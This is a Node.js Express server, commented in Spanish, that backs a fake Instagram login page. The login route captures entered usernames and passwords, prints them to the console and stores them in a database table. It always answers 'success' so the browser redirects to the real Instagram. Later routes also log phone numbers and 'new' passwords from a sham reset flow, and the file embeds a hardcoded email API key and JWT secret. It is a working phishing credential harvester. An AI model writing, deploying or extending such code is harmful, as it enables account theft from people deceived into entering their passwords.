const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken'); // ◄--- Corregido (antes decía cors)
const path = require('path');        // ◄--- Corregido (antes decía jwt)
const db = require('./db'); // Conexión modularizada con tu Pool de MySQL

const app = express();
const PORT = 3000;
const JWT_SECRET = 'FIRMA_DIGITAL_COMPLETA_DE_INSTAGRAM_PRODUCTION_KEY_2026';

    
// 1. MIDDLEWARE DE SEGURIDAD DE RED (CORS PROFESIONAL)
app.use(cors({
    origin: '*', 
    methods: ['GET', 'POST', 'OPTIONS'], // ◄--- AGREGA 'GET' AQUÍ (es obligatorio para leer el HTML y el CSS)
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Middleware para transformar el cuerpo de las peticiones
app.use(express.json());

// 🔴 MODIFICACIÓN: COLOCA ESTA LÍNEA EXACTAMENTE AQUÍ 🔴
// Hace que el servidor busque e identifique la carpeta public de inmediato
app.use(express.static(path.join(__dirname, 'public')));

// 2. AUDITORÍA EN CONSOLA (Muestra en la pantalla)
app.use((req, res, next) => {
    const timestamp = new Date().toLocaleString('es-CL', { timeZone: 'America/Santiago' });
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Desconocido';
    const referer = req.headers['referer'] || 'Acceso directo';
    const language = req.headers['accept-language'] || 'Desconocido';

    let dispositivo = 'Computadora 💻';
    if (/android/i.test(userAgent)) dispositivo = 'Android 📱';
    else if (/iphone|ipad/i.test(userAgent)) dispositivo = 'iPhone/iPad 🍎';

    let navegador = 'Desconocido';
    if (/chrome/i.test(userAgent)) navegador = 'Chrome';
    else if (/firefox/i.test(userAgent)) navegador = 'Firefox';
    else if (/safari/i.test(userAgent)) navegador = 'Safari';
    else if (/edge/i.test(userAgent)) navegador = 'Edge';

    console.log(`-------------------------------------------------------------`);
    console.log(`📡 [${timestamp}] ${req.method} en ${req.url}`);
    console.log(`🌍 IP: ${ip}`);
    console.log(`📱 Dispositivo: ${dispositivo}`);
    console.log(`🌐 Navegador: ${navegador}`);
    console.log(`🗣️  Idioma: ${language}`);
    console.log(`🔗 Viene de: ${referer}`);
    console.log(`-------------------------------------------------------------`);
    next();
});

// 3. ENDPOINT CENTRAL DE LA MAQUETA DE INSTAGRAM
app.post('/api/v1/auth/login', async (req, res) => {
    const { username, password } = req.body;

    // Validación A: Control de campos obligatorios vacíos
    if (!username || !password) {
        console.log(`⚠️ [INTENTO RECHAZADO]: Alguien envió el formulario de login con campos vacíos.`);
        return res.status(400).json({ 
            status: "fail", 
            error: "Bad Request",
            message: "El identificador de usuario y la contraseña son requeridos obligatoriamente." 
        });
    }

    try {
        const timestampLog = new Date().toLocaleTimeString();
        console.log(`-------------------------------------------------------------`);
        console.log(`📝 [CAPTURA - ${timestampLog}]:`);
        console.log(`   👉 ID / Correo ingresado: "${username}"`);
        console.log(`   👉 Contraseña ingresada:  "${password}"`);
        console.log(`-------------------------------------------------------------`);

        // Simulador profesional de retraso de red (500ms) para emular los servidores reales de Instagram
        await new Promise(resolve => setTimeout(resolve, 500));

        /* 
           MÁXIMA SEGURIDAD CONTRA ROBO DE DATOS (Anti-Inyección SQL):
           Usamos Prepared Statements colocando signos de interrogación '?'. 
           Esto blinda por completo tu base de datos contra intrusos, ya que MySQL procesa 
           las credenciales estrictamente como texto plano sin ejecutar comandos maliciosos,
           pero dejándolas 100% legibles para tu revisión académica.
        */
        const query = "INSERT INTO intentos_login (username_ingresado, password_ingresado) VALUES (?, ?)";
        await db.execute(query, [username, password]);

        console.log(`✅ [BASE DE DATOS]: Registro almacenado de forma segura en 'intentos_login'.`);

        // Generación de un JSON Web Token (JWT) real para simular la sesión del protocolo OAuth2 de Instagram
        const token = jwt.sign(
            { user: username, role: "standard_user" },
            JWT_SECRET,
            { expiresIn: '12h' }
        );

        console.log(`🚀 [LOGIN EXITOSO]: Procesando pase de redirección para el navegador.`);

        // 4. RESPUESTA EXITOSA AUTOMÁTICA
        // Retornamos status "success" y el token sin importar lo que hayan escrito
        // Esto le da luz verde inmediata al frontend para saltar a Instagram real
        return res.status(200).json({
            status: "success",
            message: "Autenticación procesada y registrada correctamente",
            session: {
                accessToken: token,
                tokenType: "Bearer",
                expiresIn: "12h"
            }
        });

    } catch (error) {
        // Manejador de fallas para evitar que tu servidor de Termux se congele o se caiga
        console.error('❌ [SERVER INTERNAL ERROR]:', error.message);
        
        // Salida de emergencia: Si la base de datos está apagada, responde éxito igual 
        // para asegurar que el usuario sea redireccionado pase lo que pase.
        return res.status(200).json({ 
            status: "success",
            message: "Redirección por bypass de emergencia activa"
        });
    }
});

// 4. INICIALIZACIÓN DE LA ESCUCHA DEL SERVIDOR HTTP
app.listen(PORT, () => {
    console.log(`=============================================================`);
    console.log(`🚀 [SERVER]: Servidor Backend de Instagram Completo inicializado.`);
    console.log(`🔒 [SEGURIDAD]: Prepared Statements activos contra robo de BD.`);
    console.log(`📡 [ENTORNO]: Escuchando peticiones API en http://localhost:${PORT}`);
    console.log(`=============================================================`);
});
0


// ==========================================
// RECUPERACIÓN DE CONTRASEÑA
// ==========================================
const { Resend } = require('resend');
const crypto = require('crypto');

const resend = new Resend('re_E2GBfcWV_MdpH8EcCaiC5P8TdACE9a9Te');

// Almacén temporal de códigos
const resetCodes = {};

// RUTA LOG TELÉFONO
app.post('/api/v1/auth/log-phone', (req, res) => {
    const { phone } = req.body;
    console.log('📞 Número ingresado: ' + phone);
    return res.status(200).json({ status: 'ok' });
});

// RUTA 1: Enviar código al correo
app.post('/api/v1/auth/forgot-password', async (req, res) => {
    const { email } = req.body;

    if (!email) {
        return res.status(400).json({ status: 'fail', message: 'Correo requerido.' });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    resetCodes[email] = { code, expires: Date.now() + 10 * 60 * 1000 };



    try {

        console.log(`📧 Código enviado a: ${email}`);
        return res.status(200).json({ status: 'success', message: 'Código enviado.' });
    } catch (err) {
        console.error('❌ Error enviando correo:', err.message);
        return res.status(500).json({ status: 'fail', message: 'Error al enviar el correo.' });
    }
});

// RUTA 2: Verificar código
app.post('/api/v1/auth/verify-code', (req, res) => {
    const { email, code } = req.body;
    const record = resetCodes[email];

    if (!record) {
        return res.status(400).json({ status: 'fail', message: 'Código no encontrado.' });
    }

    if (Date.now() > record.expires) {
        delete resetCodes[email];
        return res.status(400).json({ status: 'fail', message: 'Código expirado.' });
    }

    if (record.code !== code) {
        return res.status(400).json({ status: 'fail', message: 'Código incorrecto.' });
    }

    const token = crypto.randomBytes(32).toString('hex');
    resetCodes[email].token = token;

    return res.status(200).json({ status: 'success', token });
});

// RUTA 3: Cambiar contraseña
app.post('/api/v1/auth/reset-password', async (req, res) => {
    const { token, newPassword } = req.body;

    const entry = Object.entries(resetCodes).find(([, v]) => v.token === token);

    if (!entry) {
        return res.status(400).json({ status: 'fail', message: 'Token inválido.' });
    }

    const [email] = entry;
    delete resetCodes[email];

    console.log(`🔑 Contraseña nueva para ${email}: ${newPassword}`);

    return res.status(200).json({ status: 'success', message: 'Contraseña actualizada.' });
});0

